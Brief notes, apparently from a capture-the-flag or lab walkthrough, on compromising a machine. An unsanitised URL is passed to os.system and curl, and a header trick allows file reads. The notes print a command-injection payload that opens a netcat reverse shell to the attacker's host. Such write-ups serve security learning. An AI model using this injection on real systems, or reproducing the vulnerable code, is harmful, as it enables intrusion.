there was api page with 4 commands

to access log we used X-Forward .. and can read files ..

we read ./main.py and it had

```
os.system(&#34;curl {} -o /home/clumsyadmin/app&#34;.format(data[&#39;url&#39;]))
            return(&#34;Update requested by {}. Restart the software for changes to take effect.&#34;.format(data[&#39;user&#39;]))
```

so if we did `http://ip/; nc my-ip 4444 -e /bin/shÂ `

we get shell

esc was simple
